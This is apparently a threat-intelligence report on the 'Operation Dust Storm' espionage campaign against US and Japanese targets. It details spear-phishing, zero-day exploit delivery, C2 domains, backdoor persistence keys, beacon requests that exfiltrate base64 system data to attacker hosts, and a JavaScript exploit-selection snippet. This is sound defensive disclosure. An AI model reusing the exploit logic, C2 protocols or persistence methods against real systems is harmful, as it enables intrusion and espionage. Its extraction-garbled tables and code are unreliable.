phishing email from a purported Chinese student seeking advice or asking the target a question following a presentation. Media coverage of these attacks included “url blogs/inside-back-door-attack” , 2 and “url com/730” which named the early backdoor variants “Misdat”. The secondary C2 server from Symantec’s writeup was mentioned in news reports elsewhere as “honeywells.tk”; 2011. This address is coincidentally the same IP address that one of the earliest Misdat samples that SPEAR identified beaconed to during the same timeframe. A paper published in August 2011 by Ned Moran via Usenix (url 105484-Moran.pdf) described in detail an attack by thisthreat group during April 2011. The attack was initiated by a spear phishing email that contained a Word document embedded with a zero-day Flash exploit (CVE-2011-0611). The final payload described in the report matched other confirmed Misdat samples, and beaconed to “msejake.7766. As to other documented cases, the attacker started interacting with the infected machine within minutes of compromise to begin manual network and host enumeration. In October 2011, the group attempted to take advantage of the ongoing Libyan crisis at the time and phish the news cycle regarding Muammar Gaddafi’s death on October 20, 2011. It appears that in addition to some US defense targets, this campaign was also directed at a Uyghur mailing list. This time, the group used a specially crafted malicious Windows Help (.hlp) file, which exploited CVE- 2010-1885. The hlp files, when opened, would execute a piece of JavaScript code via “mshta.exe”, which in turn launched a second piece of Visual Basic Script using the Windows scripting host. This secondary piece of VBS code was then responsible for decoding the payload from the body of the hlp file and executing it. The first stage payloads used in these attacks were Misdat variants stored base64 encoded within the hlp file. The samples SPEAR identified both communicated to the domain “msevpn.3322.org”, which resolved to the of this IP address yielded several additional dynamic DNS domains that were used for command and control, as well as several standard domains that were used by the group from May 2010 up until December 2015.Registration Email AddressDomain NameDate First Registeredwkymyx (at) 126.comwkymyx (at) 126.comwkymyx (at) 126.comduomanmvp (at) 126.comduomanmvp (at) 126.comduomanmvp (at) 126.comamazonwikis.comsfcorporation.comadobeus.comadobekr.commoviestops.commoviestops.comApril 21, 2010May 5, 2010June 8, 2011May 30, 2010June 7, 2011December 17, 2012Figure 1: Domain Registrations for 2010-20112 The Symantec article incorrectly states that the Gh0st RAT protocol utilizes SSL, when in fact, it uses Zlib compression.2OPERATION DUST STORMEarly infrastructure for the 2010-2011 timeframe used by the group relied heavily on two email addresses, ""wkymyx (at) 126.com” and “duomanmvp (at) 126.com”, for domain registration. The attackers typically used either seemingly random four-character subdomains or common words like image, blog, ssl, pic, mail, news, etc. There was also evidence to suggest this group attempted to gather user credentials for Yahoo, Windows Live and other accounts through several different phishing domains during July and August 2011. While SPEAR was unable to recover the original pages served, the domains these pages were hosted on “login.live.adobekr.com”, are: “login.live.wih365.com”, and “yahoomail.adobeus.com”. resolutions for each of the domains were generally short- lived, with none of them lasting more than a month.Identity Crisis: Zero-Day Attacks SPEAR identified another Operation Dust Storm campaign in June 2012 that leveraged both CVE-2011-0611, a Flash exploit the group had used previously, and CVE- 2012-1889, an Internet Explorer zero-day. The attackersused the domain “mail.glkjcorp.com” to deliver the exploits, and the domain was hosted on the IP address unable to definitively tie this particular exploit site to a watering hole or phishing campaign, however, numerous other CN-APT operators leveraged the Internet Explorer zero-day during the same period using both techniques. The exploit domain “glkjcorp.com” was registered shortly before the attack on May 24, 2012. Two different emails were used in the registration of this domain: “effort09 (at) hotmail.com” and “zaizhong16 (at) 126.com”. This attack was the first to use the file “DeployJava. js” to fingerprint installed software on victim systems prior to delivery and ensure a known effective exploit was deployed. This JavaScript file was first used and documented by Ahnlab a month earlier in the Gong Da Exploit Kit: url securityinfo/secunews/secuNewsView.do?menu_ dist=2&seq=19418. The “DeployJava.js” worked in conjunction with another script embedded in the exploit page, to deliver the Flash exploit if the version of IE was 8 or 9 or deliver the IE zero-day if the version of IE was 6 or 7.if (((i9> -1) ||(i8> -1))&&w7>-1&&ja){ flash.Movie = vars; } else if((i8>-1)&&(xp>-1)){ flash.Movie = vars; } else if((i6>-1||i7>-1)&&(xp>-1)){ document.body.innerHTML+=”<object classid=\”clsid:D27CDB6E-AE6D-11cf-9 6B8-444553540000\” width=\”100%\” height=\”100%\” id=\”ki\”><param name=\”mov- ie\” value=\””+vars+”\” /><param name=\”quality\” value=\”high\” /><param name=\”bgcolor\” value=\”#ffffff\” /><param name=\”allowScriptAccess\” val- ue=\”sameDomain\” /><param name=\”allowFullScreen\” value=\”true\” /><\/ob- ject>”; setTimeout(“document.body.innerHTML+=\”<iframe src=faq.htm width=200 height=200><\/iframe>\””,2000); }Figure 2: JavaScript Snippet for Exploit Delivery ChoiceThe “DeployJava.js” script was used extensively by other APT groups throughout 2012 and 2013, including Nitro in August of hxxp://gifas.cechire.com/fr/deployJava.js hxxp://goddess.nexon.com.au/inc/deployJava.js hxxp://java.ree.pl/meeting/deployJava.js hxxp://jcsh-web.com.cn/ADMIN/inc/conn/deployJava.js hxxp://naedco.com/img/common/t/deployJava.js hxxp://songwol.co.kr/employee/deployJava.js hxxp://spacexmt.spacedevcoop.com/checkplayer/deployJava.js hxxp://tavis.tw/tmp/deployJava.js hxxp://www.jcsh-web.com.cn/admin/inc/conn/deployjava.js hxxp://www.jcsh-web.com.cn/ADMIN/inc/conn/deployJava.js hxxp://www.toisengyo.jp/24/11/deployjava.jsFigure 3: Other Later Targeted Attacks Leveraging DeployJava.jsAlso of note in this attack: the final payload (hxxp://mail. glkjcorp.com/pic/win.exe) was delivered encoded with a single-byte XOR against the byte 0x95, skipping both the key itself and zero in an attempt to avoid exposing the key. This method of obfuscation at the time would have ensured delivery of the payload past most IDS/IPS systems. The unencoded payload was a hybrid of the older Misdat backdoor and its next generation, the S-Type backdoor. The backdoor would first attempt to use the old Misdat network protocol and communicate to “smtp. adobekr.com”. If that failed, it would fallback to the newer HTTP-based S-Type protocol which communicated with “mail.glkcorp.com”. The group completely abandoned older incarnations of the Misdat backdoor for their first stage implants in 2013, and moved predominantly to the new S-Type backdoors. A full analysis of both of these backdoors is included in the “Implant Analysis” section.Into the Future: Japanese Targets SPEAR noticed a fairly large lull in activity from March 2013 to August 2013. Coincidentally (or perhaps not), Mandiant released their APT 1 report on February 19, 2013 (url /02/mandiant-exposes-apt1-chinas-cyber-espionage- units.html). Activity didn’t cease entirely, but the volume of malware SPEAR was able to collect during this period was remarkably decreased. Several new domains were registered during this time period, which would go on to become the crux of the group’s operations for the next several years. There was some anecdotal evidence to suggest Operation Dust Storm leveraged an Ichitaro zero-day “CVE-2013- 5990” to target Japanese victims. This zero-day was first reported publicly on November 12, 2013. Ichitaro is a popular Japanese word processing program designed byRegistration Email Addressnewsq13 (at) hotmail.comnewsq13 (at) hotmail.comhouqiangliuliu (at) 163.comDomain Nametomshardpc.comwordoscorp.comprojectscorp.netwantsamsung (at) 21cn.comelecarrow.comDate First RegisteredMarch 27, 2013March 27, 2013October 9, 2013October 9, 2013Figure 4: New C2 Domains Registered in 2013a company called JustSystems. While SPEAR was unable to find the exact sample that delivered a Misdat payload, our team analyzed numerous other related samples. The backdoors were encoded within the exploit documents using a very familiar method of XOR’ing skipping zero bytes and the key itself; only this time the key used for encoding was 0x85. Throughout 2013, the other incidents SPEAR identified all deployed the S-Type backdoor exclusively. This year also marked an epoch in terms of relying on dual persistence locations in case the victim had lower permissions and couldn’t perform certain actions like writing to the registry or certain file locations. Older techniques like using the “Startup” folder made a resurgence during this time period. Beginning in February 2014, there was definitive evidence to suggest the group used a watering hole attack on a popular software reseller to deliver an Internet Explorer zero-day, CVE-2014-0322, to a number of unsuspecting targets. The exploit itself was hosted on “hxxp://krtzkj. time period, the domain “js.amazonwikis.com” also pointed to this IP address and was used in previous attacks relied on web-based exploits. The intermediate payload “Erido.jpg” was an XOR encoded executable common to other CVE-2014-0322 attacks, which ultimately delivered a variant of the S-Type backdoor to the victim.thatOperation Dust Storm also began to branch out in 2014 into establishing and finding alternative means of persistence on victim systems. SPEAR identified several second-stage samples that needed to be installed as a ServiceDLL in order to work properly, as well as one that functioned as a router manager for the normal Routing and Remote Access Service. Doing a simple search for this registry key, “HKLM\System\CurrentControlSet\ Services\RemoteAccess\RouterManagers\IP\DllPath” yielded numerous other pieces of malware; however, SPEAR was only able to identify one of the group’s samples that took advantage of this. Several new domains were also registered in 2014 to support expanding operations.Registration Email AddressDomain NameDate First Registeredysymsq (at) 126.commyexmail (at) aol.commyexmail (at) aol.comhkabinc.comexemail.comsslmails.comMarch 26, 2014March 26, 2014March 6, 2015Figure 5: C2 Domains Registered in 2014 and 2015Here and Now: Companies Compromised Activity in 2015 was significantly more interesting, and prompted SPEAR to begin studying Operation Dust Storm’s other activities. SPEAR identified a number of second-stage backdoors with hardcoded proxy addresses and credentials. These proxy addresses revealed the attacker had compromised a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation.In one case that transpired in early February 2015, SPEAR was able to recover the second-stage implant delivered by a variant of the S-Type backdoor shortly following its initial reconnaissance. What caught our attention was the fact that the victim was part of the investment arm of a major Japanese automaker. The attack came just two weeks before eleven unions representing Japan’s autoworkers demanded a monthlyraise of six thousand yen. (url news/articles/2015-02-18/japan-auto-workers-seek- pay-raise-to-share-in-record-car-profits) The second-stage implants were also programmed and compiled using Microsoft Visual Studio 6, an archaic version of Visual Studio that seems to be preferred by malware authors. Despite using an old version of Visual4OPERATION DUST STORMOPERATION DUST STORM5Studio, the backdoor is well designed by comparison and provides a full suite of functionality to the attacker. No antivirus vendors seem to reliably detect most of the variants SPEAR identified. Perhaps even more interesting was the fact that the group adopted and eventually customized several Android backdoors to suit their purposes in the beginning of 2015. The group rapidly expanded their mobile operations in May 2015. The initial backdoors were relatively simple, and would continually forward all SMS messages and call information back to the C2 servers. Later variants became much more complex, and included the ability to enumerate and exfiltrate specific files directly from the infected devices. All of the identified victims for the Android Trojans resided in Japan or South Korea. The infrastructure to supportthe Android campaigns was massive in comparison to previous operations. More than two hundred domains have been identified to date. SPEAR plans to release more information regarding this threat shortly. SPEAR discovered two more waves of attacks that started in July 2015 and October 2015. Interestingly, one of the primary targets was a Japanese subsidiary of a South Korean electric utility. Similarly, SPEAR identified a separate intrusion into a major Japanese oil and gas company. The exact motivations for this particular attack were unclear; however, if this attack coincided with all previous operations, the most likely goals were reconnaissance and long-term espionage.CONCLUSION At this time, SPEAR does not believe the attacks were meant to be destructive or disruptive. However, our team believes that attacks of this nature on companies involved in Japanese critical infrastructure and resources are ongoing and are likely to continue to escalate in the future. It’s clear from SPEAR’s research that Operation Dust Storm has slowly evolved over time to become increasingly effective. Early operations were extremely blunt, relatively unsophisticated, and readily picked up by the security industry. As the group became more and more focused on Japan, less and less of their tactics and malware appeared in reports or write-ups. The targets identified escalated both in size and in the scope of affected industries. As a result, SPEAR felt obligated to share with the community and public what was discovered recently, to hopefully stunt the attackers’ progress for a time. SPEAR has been closely following the aftermath of public reporting. We have decided that even though disclosure often forces attackers to change, it also enables defenders to better detect and expel “real” threats from their environments. SPEAR would like to thank the Japanese Computer Emergency Response Team (JP-CERT) for their cooperation, assistance, and time during our investigation. NOTE: A large number of the older Misdat domains were sinkholed by a private entity in late December 2015. The this sinkhole, please contact us at: threat-intel [at] cylance [dot] com.IMPLANT ANALYSIS MISDAT BACKDOOR (2010-2011) Most early samples of Misdat were not packed; however, following what appeared to be heightened awareness by security vendors, samples in late 2010 and 2011 were typically packed with the executable packer, UPX version 3.03 (hxxp://upx. sourceforge.net/). All of the Misdat samples SPEAR identified were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file; as a result, SPEAR was forced to use the resource compile times of samples to get a better idea of when the actual backdoors were compiled.FILE CHARACTERISTICSSHA256 Volatile Evidence: • Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprising the volume serial number, decryptednetwork configuration data, and encoded campaign identifierFile System Modifications: • The backdoor will copy itself to %CommonFiles%\{Unique Identifier}\msdtc.exe • It may attempt to open then delete the file C:\2.hiv, c:\t2svzmp.kbp, or c:\tmp.kbm depending on the sample. Laterversions from 2011 all used c:\t2svzmp.kbpRegistry Modifications: • The malware may create the registry key HKCU\Software\dnimtsoleht\StubPath, HKCU\Software\snimtsOleht\StubPath,or HKCU\Software\Backtsaleht\StubPath for persistence• In SPEAR’s tests, StubPath always pointed to the newly created msdtc.exe binary within the %CommonFiles% directory,with either the “/ok” or “/start” switch depending on the sample• May create the Registry Key HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8- b5c1-bd56d32fbda7} or HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1- 70c2c3bc7905}6OPERATION DUST STORMOPERATION DUST STORM7NETWORK-BASED INDICATORS Observed network traffic was always base64 encoded plain text over a raw socket to common ports like 80, 443, or 1433. A operating system version, unique sample identifier (SPEAR believes this is a date: 1/12/2010), as well as the unique MD5 used for the mutex were sent to the server. Once it registers with the C2, the backdoor sends the string “YWN0aXZlfA==” which decodes to “active|”. The backdoor will then continue to send that string and wait until it receives one of the following commands from the C2 server:CommandshellfilesuploaddownrestartcloseosdcloseucloseunintallFunction Initiates a new connection that provides shell functionality to the attacker to execute commands. Subcommands include shellstart, command and stop.Initiates a new connection that provides file management and enumeration capabilities to the attacker. Subcommands include filelist, dirlist, driver (enu- merates logical drives), renamefile, delete, run, open and stop.Provides the ability to upload files directly to the C2.Provides the ability to download files from the C2.Restarts the victim system through a call to the Windows API ExitWindowsEx.Shuts down the system via ExitWindowsEx API.Closes the socket connection to the C2.Appears to do the same as the dclose command.Deletes the Active Setup registry key and deletes the backdoor before termi- nating the process.Figure 7: Network Commands Supported by the Misdat BackdoorDETAILS The backdoors were relatively simple and provided the attacker the ability to upload and download files, manipulate and enumerate files, execute shell commands, disconnect from the C2, uninstall the backdoor, and shutdown or restart the system. The backdoors could also potentially take the command line parameters “/ok” or “/start”; the switches changed the user context under which the process runs. If no switch was provided when executed, the backdoor will copy itself to “%CommonFiles%\ {Unique Identifier}\msdtc.exe”, where the unique identifier is the first ten characters of the MD5 hash used as the mutex. It will then configure one of the Active Setup and associated registry keys above to establish persistence on the system.SPEAR identified and reversed the encoding mechanism used for obfuscating network callback information and what appeared to be a unique campaign identifier. The following script can be used to decode these obfuscated strings.def decode_chars(a, b): return chr((26 * (ord(a) - ord('A'))) + (ord(b) - ord('A'))) def decode(s): 2) + 1])) + rolling_key) + 0xda3brolling_key = 0x783 result = """" for index in xrange(len(s)/2): for index in xrange(len(result)): return real_resultresult += decode_chars(s[index * 2], s[(index * 2) + 1])i = index + 1 real_result += chr(((rolling_key >> 8) & 0xff) ^ ord(result[i - 1])) rolling_key = 0xdbd9 * (ord(decode_chars(s[index * 2], s[(index *Figure 8: Python Script for Decoding Obfuscated Misdat StringsFILE CHARACTERISTICSSHA256 Domain: 323332.3322.org Ports: 80, 443, 1433 Domain: 323332.3322.org Ports: 80,443, 1433 Domain: msejake.7766.org Ports: 80, 443, 1433 Domain: msevpn.3322.org Ports: 80, 443, 8080 Domain: msevpn.3322.org Ports: 80, 443, 8080 Domain: msevpn.3322.org Ports: 80, 443, 8080 Domain: msevpn.3322.org Ports: 80, 443, 8080Figure 9: Decoded Campaign Identifiers and Network Callback Information Also of interest was the fact that all of the samples would attempt to detect whether or not the victim was using a Japanese keyboard via a call to the Windows API “GetKeyboardType” and report that fact back to the attacker.8OPERATION DUST STORMOPERATION DUST STORM9MIS-TYPE HYBRID BACKDOOR (2012) In 2012, Operation Dust Storm slowly migrated to a hybridized backdoor, which actually contained two entirely separate backdoors within the same binary. This backdoor would first attempt to establish an interactive shell using the Misdat base64 encoded network protocol over a raw TCP socket. If the initial communication to the first C2 failed, the backdoor would fallback to a secondary HTTP-based protocol and communicate to an alternate C2. Hybrid variants SPEAR identified were compressed with UPX version 3.03.FILE CHARACTERISTICSSHA256 446c91c848130e228e84376b0aaf441File SizeResource Compile Time30,720 Bytes02-23-2012 14:47:18 UTC30,720 Bytes06-18-2012 22:39:02 UTCFigure 10: File Details of the Hybrid BackdoorsHOST-BASED INDICATORS Volatile Evidence: • Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprised of the volume serial number, decryptednetwork configuration data, encoded network configuration data, and encoded campaign identifier• May create a temporary user on the system named “Lost_{Unique Identifier}” with the password “fuck~!@6”{UniqueIdentifier}”• May create the folder %System%\{Unique Identifier} temporarily. • May create files in %AppData%\{Unique Identifier} that end in “tmp.exe” • May create the files:• %AppData%\{Unique Identifier}\HOSTRURKLSR • Contains the results of the command “cmd.exe /c ipconfig /all” • %AppData%\{Unique Identifier}\NEWERSSEMP • Contains the results of the command “cmd.exe /c net user {Username}”File System Modifications: • The backdoor will copy itself to %AppData%\{Unique Identifier}\msdtc.exe – where the unique identifier is the first tencharacters of the MD5 hashRegistry Modifications: • The malware may create the registry key HKCU\Software\bkfouerioyou• Creates the value StubPath pointing to %AppData%\{Unique Identifier}\msdtc.exe• Will create one of these registry keys for persistence:• HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-• HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier} – First 12bytes{Unique Identifier} – First 12bytesNETWORK-BASED INDICATORS The malware will make DNS requests for the domains “smtp.adobekr.com” and “mail.glkjcorp.com” or “auto.glkjcorp.com”. Both samples were configured to communicate first to “smtp.adobekr.com” using the Misdat network protocol described above over TCP port 80, 443, and 25. If a response was not received from the C2, the samples would fallback to the secondary HTTP protocol and communicate to the alternate C2 using the same TCP ports.POST /index.asp HTTP/1.1 Accept: Accept: */*, /index.asp, mail.glkjcorp.com Content-Type: application/x-www-form-urlencoded User-Agent: FirefoxApp Host: mail.glkjcorp.com Content-Length: 334 Cache-Control: no-cache id=e263314342d1f1b9&type=post&stype=info&data=V2luZG93cyBYUA0KTUFMV0FSRS9j- GhvdXJzMTUgbWludXRlcw0KDQoNCiBDb3VudCA9IDANCk9wZW5TY01hbmFnZXIgT0suDQo=The initial POST request always used the static User-Agent “FirefoxApp” and contained operating system information, user information, the results of several permissions tests, the file system, and system uptime. If the backdoor did not receive a response, it would then try to communicate the same base64 encoded information in the URI of a GET request.Figure 11: Initial S-Type BeaconWindows XP {Hostname}/{Username}/Administrators Create User Lost_e26331 Success. Create Dir Success. Write RegKey Error. FileSystem : NTFS System RunTime:0 day0 hours15 minutes Count = 0 OpenScManager OK.Follow-on requests used the User-Agent of the default browser on the system as evidenced below.Figure 12: Contents of the Decoded POST Request from the Figure AboveGET /index.asp?mmid=e263314342d1f1b9 HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322) Accept-Encoding: gzip, deflate Host: mail.glkjcorp.com Connection: Keep-AliveOpenScManager OK.Figure 13: Follow-on HTTP TrafficThe id and mmid fields in the figures above both used the first 16 characters of the unique identifier created for the mutex. The Misdat protocol provided the attacker most of the features of a full-fledged backdoor, while the secondary protocol appeared to primarily be used as an update mechanism to load additional malware on the system.10OPERATION DUST STORMOPERATION DUST STORM11NETWORK-BASED INDICATORS DETAILS The backdoor could be executed with three different switches, “/ok”, “/Start”, or “/fuck”. These switches affected the context under which the process would be run and whether or not the binary would delete itself once executed.SwitchDescriptive PurposeSelf-DeleteS-TYPE BACKDOOR (2013-2014) After experimenting with a hybrid of the Misdat and S-Type backdoors, in 2013 Operation Dust Storm abandoned the earlier Misdat network protocol entirely. This was likely a direct result of the demonstrated effectiveness of an HTTP-based protocol for command and control, or simply an adaptation to more corporations leveraging web-based proxies. All samples identified were programmed using Borland Delphi and made use of custom classes to implement common backdoor functionality. The majority of samples SPEAR identified in 2013 were packed with UPX version 3.03, while later 2014 variants were not./ok/Start/fuckNoExecuted the malware directly under the current running process using the context of the user that started the application (can be system).Executed the malware under explorer.exe in the context of whatever user executed the application (can be system). This was the switch used by the malware when setting persistence in the registry.Forced execution of the malware under explorer.exe in the context of the user running explorer.exe (scanned active processes and located the explorer process).Started the malware in a process called msdtc.exe which ran as an orphaned process under explorer.exeNoNoNoYesFigure 14: Description of Command Line Execution Switches for the BackdoorThe backdoor attempted to run a number of tests to determine the privilege level of the compromised user, including whether or not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can access the service manager via a call to “OpenSCManagerA”.The user test was performed by utilizing the NetUserAdd and NetUserDel Windows APIs; the test attempted to create the temporary user “Lost_{Unique Identifier}” with the password “fuck~!@6{Unique Identifier}”. If the secondary network protocol was activated, the backdoor would also execute two commands via the command interpreter to gather system information: “cmd.exe /c ipconfig /all” and “cmd.exe /c net user {Username}”. It would temporarily write the output of these commands to the files, “%AppData%\{Unique Identifier}\HOSTRURKLSR” and “%AppData%\{Unique Identifier}\NEWERSSEMP” respectively. This information was then base64 encoded and transmitted to the C2 server within the URI of a GET request. The S-Type network protocol is described in greater detail below. Also of note is that the backdoor would continue to attempt to beacon to 46c91c848130e228e84376b0aaf441Network CallbacksPrimary: smtp.adobekr.com Secondary: hxxp://mail.glkjcorp.com/index.asp TCP Port: 80, 443, 25Primary: smtp.adobekr.com Secondary: hxxp://auto.glkjcorp.com/us/index.asp Volatile Evidence: • May create a mutex named “{Unique Identifier}_KB10B2D1_CIlFD2C” • May create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{UniqueIdentifier}”• May create the folder %System%\{Unique Identifier} temporarily File System Modifications: • The backdoor will copy itself to %CommonFiles%\{Unique Identifier}\msdtc.exe while other observed variants used%Appdata%\{Unique Identifier}\msdtc.exe• May create the file %HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk• This shortcut will point to the msdtc.exe file in %CommonFiles% with the “/Start” switch• May create temporary files in %temp%\{random numbers}.tmp Registry Modifications: • Will temporarily create the registry key HKCU\SOFTWARE\AdobeSoft • May create the registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters ofUnique Identifier}• May create the Registry keys:• HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\ssl.projectscorp.net\http • HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\ssl.projectscorp.net\httpsNETWORK-BASED INDICATORS The backdoor communicated to ""ssl.projectscorp.net"" and ""pic.elecarrow.com"" primarily on port 80; however, communication would also fallback to port 443 or 8080 if initial communication failed. The backdoor used HTTP to communicate with the C2 servers; data was transmitted base64 encoded in the URI of GET requests or sent in the body of a POST request. It used two hardcoded User-Agents, “FirefoxApp” and “Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)” in initial requests, as well as the default User-Agent of the system in its later communications.12OPERATION DUST STORMOPERATION DUST STORM13Example HTTP requests are presented in the figures below.POST hxxp://pic.elecarrow.com:80//Item/2016757.aspx HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1) Host: pic.elecarrow.com:80 Content-Length: 93 Connection: Keep-Alive Cache-Control: no-cache POST /pic/index.asp HTTP/1.1 Accept: Accept: */*, /pic/index.asp, ssl.projectscorp.net Content-Type: application/x-www-form-urlencoded User-Agent: FirefoxApp Host: ssl.projectscorp.net Content-Length: 354 Cache-Control: no-cache id=E8C465FC&type=post&stype=info&data=VVNFUi1ENjkyMUY2MjE1fFdpbmRvd- ZGRyZXNzLg==Figure 17: Initial POST Requests Sent by the S-Type BackdoorGET /pic/index.asp?id=E8C465FC&type=ie&stype=info&data=VVNFUi1ENjkyMUY2M- HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322) Accept-Encoding: gzip, deflate Host: ssl.projectscorp.net Connection: Keep-Alive GET /pic/index.asp?mmid=E8C465FC HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322) Accept-Encoding: gzip, deflate Host: ssl.projectscorp.net Connection: Keep-AliveFigure 18: Sample Get Requests Sent by the S-Type Backdoor{Hostname}|Windows XP/{Username}|1??23Сʱ43??|TZ-131013| {Hostname}/{Username}/Administrators Create User Error. 0 Create Directory Success. No ProxyAddress.Figure 19: Decoded Data Parameter from Figure AboveThe backdoor attempts to run a number of tests to determine the privilege level of the compromised user, including whether or not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can access the service manager. This information is transmitted along with the type of file system and any proxy information necessary to access the Internet. The backdoor may also make network requests with the following variables in the URI “&type=ie&”, “stype=info&data=”, “stype=srv&data=”, “stype=con&data=”, “stype=user&data=”, “mmid=”, “&type=post&stype=”, or “&status=”.DETAILS In a similar way as previous Dust Storm backdoors, this one attempted to detect whether or not the victim was using a Japanese keyboard via the “GetKeyboardType” API. The backdoor itself provided the attacker the ability to execute shell commands, enumerate system and network information, manipulate files, and download and execute an arbitrary file. Initial observations suggest this was largely a reconnaissance platform that would then be upgraded by the attacker to a full-featured backdoor. The backdoor performed the initial tests described above by first attempting to add the user “Lost_{Unique Identifier}” with the password “pond~!@ {Unique Identifier}” to the system using the NetUserAdd API; if successful, it then removed this user via the NetUserDel API. The backdoor then attempted to create the folder “%System%\{Unique Identifier}” with the CreateDirectoryA API and removed it using the RemoveDirectoryA API. Once these two tests were complete, it attempted to access the Windows Service Control Manager through a call to “OpenSCManagerA”. Once it communicated this information along with proxy and file system info via the initial POST requests, the backdoor attempted to execute a sequence of commands to enumerate information about the system and local network.“net start” “Ipconfig /all” “net user” or “net user /domain” depending on the value of %USERDNSDOMAIN%Figure 20: Initial Commands Executed on the System by the BackdoorThe results of these commands are transmitted base64 encoded as the data parameter within the URI, “/pic/index. asp?id={Unique_Identifier}&type=ie&stype=info&data=”. Once the results of these commands are transmitted back to the C2 server, the backdoor will continue to beacon to the URI “/pic/index.asp?mmid={Unique Identifier}” and wait for either commands to execute or an updated binary to download and execute. Any file downloaded from the C2 is sent base64 encoded and has the name “{Unique Identifier}.txt”. If the file is a binary, it is written to disk as “tmp.exe” and executed via WinExec. The backdoor will then communicate back to the C2 with either “&status=run succeed” if successful, or “&status=Error Code” if there was an error. The ""{Unique Identifier}"" referenced above is an eight-character hex-string calculated by adding the volume serial number of the C drive (or D drive if there is no C) and a CRC32 hash of the first 0x90 bytes of the encoded configuration for the backdoor. This was quite different from the earlier Misdat variants, as it can be reversed to yield the serial number of the drive. The backdoor decodes its configuration information from offset 0xE9FC. It skips the first 4 bytes, then subtracts 0x2 from each byte and XOR’s the resultant values with the first byte of the configuration block, 0x58 in this case.14OPERATION DUST STORMOPERATION DUST STORM150000E9F0 58 2C 74 14 X,t. 0000EA00 73 32 2E 2E 2A 64 79 79 2D 2D 36 78 2A 2C 39 34 s2 *dyy--6x*,94 0000EA10 3F 3D 2E 2D 3D 39 2C 2A 78 38 3F 2E 79 2A 33 3D ?=.-=9,*x8?.y*3= 0000EA20 79 33 38 3E 3F 22 78 3B 2D 2A 5A 5A 5A 5A 5A 5A y38>?”x;-*ZZZZZZ 0000EA30 5A 5A 5A 5A 4B 2A 33 3D 78 3F 36 3F 3D 3B 2C 2C ZZZZK*3=x?6?=;,, 0000EA40 39 31 78 3D 39 37 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 91x=97ZZZZZZZZZZ 0000EA50 5A 5A 5A 5A 0A 5A E5 5B CA 49 5A 5A 5A 5A 5A 5A ZZZZ.Zå[ÊIZZZZZZ 0000EA60 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A ZZZZZZZZZZZZZZZZ 0000EA70 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A 5A ZZZZZZZZZZZZZZZZ 0000EA80 5A 5A 5A 5A 43 4F D3 5A 5A 5A 5A 5A 5A 5A 5A 5A ZZZZCOÓZZZZZZZZZ Figure 21: Encoded Configuration Block0000EA00 29 68 74 74 70 3A 2F 2F 73 73 6C 2E 70 72 6F 6A )hxxp://ssl.proj 0000EA10 65 63 74 73 63 6F 72 70 2E 6E 65 74 2F 70 69 63 ectscorp.net/pic 0000EA20 2F 69 6E 64 65 78 2E 61 73 70 00 00 00 00 00 00 /index.asp 0000EA30 00 00 00 00 11 70 69 63 2E 65 6C 65 63 61 72 72 pic.elecarr 0000EA40 6F 77 2E 63 6F 6D 00 00 00 00 00 00 00 00 00 00 ow.com 0000EA50 00 00 00 00 50 00 BB 01 90 1F 00 00 00 00 00 00 P.». 0000EA60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000EA70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000EA80 00 00 00 00 19 15 89 00 00 00 00 00 00 00 00 00 ‰ 50 00 BB 01 90 1FFigure 22: Decoded Configuration BlockText strings in the decoded block are each prefaced by their length in hex. In addition to the URL “hxxp://ssl.projectscorp.net/ pic/index.asp” and the domain “pic.elecarrow.com”, the ports that attempt to beacon on 80, 443, and 8080 are highlighted in green, blue, and purple respectively. The following Python function can be used to decode these configuration blocks.def sub_single_byte_xor(buf,subb, key): out = ‘’ for i in buf: out += chr((ord(i)-subb) ^ key) return out sub_single_byte_xor(buf,0x2,0x58)Figure 23: Python Script to Decode w-Type Configuration DataZLIB BACKDOOR (2014-2015) This backdoor was the preferred second-stage implant for the group throughout 2014 and 2015. The malware was a full- featured backdoor with built-in NTLM proxy authentication support which was designed to be run as a ServiceDLL. Each sample SPEAR identified was customized to the specific victim environment and programmed using Microsoft Visual C++ 6. As a result, our team has included hashes of samples that were modified to redact victim information. SPEAR has provided as much information as possible so other victims can identify incidents.FILE CHARACTERISTICS • Exports the functions DriverDev, DriverInit, 